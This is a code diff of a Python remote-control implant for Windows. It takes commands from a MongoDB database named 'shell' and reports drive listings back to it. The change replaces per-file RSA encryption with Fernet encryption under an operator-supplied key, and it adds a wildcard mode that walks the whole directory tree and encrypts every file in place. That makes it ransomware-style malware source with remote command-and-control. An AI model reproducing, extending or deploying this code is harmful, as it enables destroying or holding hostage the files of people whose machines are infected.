@@ -1,6 +1,7 @@
 import os,subprocess
 import json
-import rsa
+from cryptography.fernet import Fernet
+from os import walk
 import socket
 import win32api
 from pymongo import MongoClient
@@ -181,72 +182,27 @@ def drives():
     upload(data)
 
 
-def key_generate(path,filename):
-    db=client['shell']
-    file_size=os.path.getsize(str(path+filename))
-    if (file_size)<400:
-        try:
-            if file_size==0:
-                file_size=512
-            publicKey, privateKey = rsa.newkeys(file_size)
-            sendable_private_key=byte_to_str(privateKey)
-            data={
-                "hostname":hostname,
-                "key":sendable_private_key,
-                "path":path,
-                "filename":filename
-            }
-            col=db['privatekey']
-            col.insert_one(data)
-            return publicKey
-        except:
-            return 404
+def encrypt(key,file):
+    try:
+        f = Fernet(key)
+        with open(file,'rb') as afile:
+            cont=afile.read()
+        cipher_content=f.encrypt(cont)
+        with open(file,'wb') as aafile:
+            aafile.write(cipher_content)
+    except Exception as e:
+        print(e)
 
-def file_valid(file_name,path):
-    valid_extension = ["c", "js", "md", "py", "ts",
-                   "cpp", "css", "txt", "html", "java", "json"]
-    extension=str(file_name).split('.')[1]
-    for i in valid_extension:
-        if i==extension:
-            if os.path.isfile(path+file_name):
-                return True
-    return False
-    
-
-def encrypt(paths,file):
-    if not paths[(len(paths)-1)]=='/':
-        paths=paths+'/'
-    if file_valid(file_name=file,path=paths):
-        try:
-            with open(paths+str(file),"r") as targets:
-                con=targets.read()
-            with open(paths+str(file),"wb") as target:
-                target.write(rsa.encrypt(con.encode(),key_generate(path=paths,filename=file)))
-        except:
-            return 404
-
-
-
-
-def decrypt(private_key,paths,file):
-    if not paths[(len(paths)-1)]=='/':
-        paths=paths+'/'
-    if file_valid(file_name=file,path=paths):
-        try:
-            with open((paths)+str(file),"rb") as targets:
-                con=targets.read()
-            with open((paths)+str(file),"w") as target:
-                target.write(rsa.decrypt(con, private_key).decode())
-        except:
-            return 404
-
-
-def byte_to_str(key):
-    return str(key.save_pkcs1(),'UTF-8')
-
-def str_to_byte(key):
-    b= bytes(key,'UTF-8')
-    return rsa.PrivateKey.load_pkcs1(b.decode('utf8'))
+def decrypt(key,file):
+    try:
+        f = Fernet(key)
+        with open(file,'rb') as afile:
+            cont=afile.read()
+        d=f.decrypt(cont)
+        with open(file,'wb') as aafile:
+            aafile.write(d)
+    except:
+        print('failed')
 
 def action_take(listen):
     db=client['shell']
@@ -280,18 +236,28 @@ def action_take(listen):
             drives()
         elif action=='encrypt':
             target_element=listen['target_element']
-            encrypt(paths=cwd,file=target_element)
+            key=listen['key']
+            key_new= bytes(key,'UTF-8')
+            if target_element=='*':
+                for (dir_path, dir_names, file_names) in walk(cwd):
+                    for i in file_names:
+                        encrypt(key_new,dir_path+'\\'+i)
+            else:
+                os.chdir(cwd)
+                encrypt(key_new,target_element)
+
         elif action=='decrypt':
             target_element=listen['target_element']
-            filters={
-                "hostname":hostname,
-                "filename":target_element
-            }
-            col=db['privatekey']
-            x=col.find_one(filters)
-            if x:
-                col.delete_one(filters)
-            decrypt(private_key=(str_to_byte(x['key'])),paths=cwd,file=target_element)
+            key=listen['key']
+            key_new= bytes(key,'UTF-8')
+            if target_element=='*':
+                for (dir_path, dir_names, file_names) in walk(cwd):
+                    for i in file_names:
+                        decrypt(key_new,dir_path+'\\'+i)
+            else:
+                os.chdir(cwd)
+                decrypt(key_new,target_element)
+            
         elif action=='showimg':
             target_element=listen['target_element']
             data={
